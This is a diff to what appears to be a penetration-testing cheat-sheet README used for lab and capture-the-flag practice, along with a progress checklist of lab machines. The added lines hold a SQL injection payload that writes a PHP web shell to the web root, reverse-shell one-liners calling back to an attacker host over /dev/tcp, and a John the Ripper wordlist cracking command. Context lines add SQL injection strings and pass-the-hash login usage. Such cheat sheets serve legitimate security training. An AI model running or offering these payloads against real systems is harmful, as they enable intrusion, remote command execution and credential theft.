@@ -66,6 +66,10 @@ Finding columns with a useful data type
 ' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
 'OR 1=1--
 ```
+#### Get a Shell
+```
+' union select '<?php system($_GET["cmd"]); ?>' into outfile '/var/www/html/shell.php' -- -
+```
 ### Scaning & Enumeration
 
 #### [Nmap](https://nmap.org/)
@@ -92,6 +96,8 @@ list of Unix binaries which can escalate privileges
 search for possible paths to escalate privileges on Linux
 #### [Winpeas](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
 search for possible paths to escalate privileges on Windows
+#### [pspy](https://github.com/DominicBreuker/pspy)
+pspy is a command line tool designed to snoop on processes without need for root permissions.
 #### [Metasploit](https://github.com/rapid7/metasploit-framework)
 #### [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit/)
 A modified version of the passing-the-hash tool collection
@@ -129,6 +135,11 @@ evil-winrm -u Administrator -H ADMIN_HASH -i IP
 Hydra is a parallelized login cracker which supports numerous protocols to attack
 #### [john the ripper](https://www.openwall.com/john/)
 John the Ripper is an Open Source password security auditing and password recovery tool available for many operating systems
+
+```
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
 #### [hashcat](https://hashcat.net/hashcat/)
 ```
 hashcat -m 18200 hash.txt passwordlist.txt --force
@@ -170,6 +181,14 @@ git-dumper http://bullybox.local/.git .
 
 #### [SecLists](https://github.com/danielmiessler/SecLists/tree/master)
 It's a collection of multiple types of lists used during security assessments, collected in one place.
+
+### Reverse Shell via One-liner
+```
+sh -i >& /dev/tcp/$KaliIP/4444 0>&1
+```
+```
+bash -c "bash -i >& /dev/tcp/$KaliIP/4444 0>&1
+```
 
 ## Walkthrough Labs
 
@@ -301,15 +320,15 @@ It's a collection of multiple types of lists used during security assessments, c
 - [X] [Easy] Codo ([writeup](/writeups/Codo.md))
 - [X] [Crane]()
 - [X] [Exfiltrated]()
-- [ ] [Extplorer]()
+- [X] [Extplorer]()
 - [ ] [Fanatastic]()
 - [ ] [Fired]()
-- [ ] [Flu]()
-- [ ] [Hawat]()
+- [X] [Flu]()
+- [X] [Hawat]()
 - [ ] [Hetemit]()
 - [X] [Easy] Hub ([writeup](/writeups/Hub.md))
 - [ ] [Hunit]()
-- [ ] [Image]()
+- [X] [Image]()
 - [X] [Easy] Jordak
 - [ ] [Lavita]()
 - [ ] [law]()
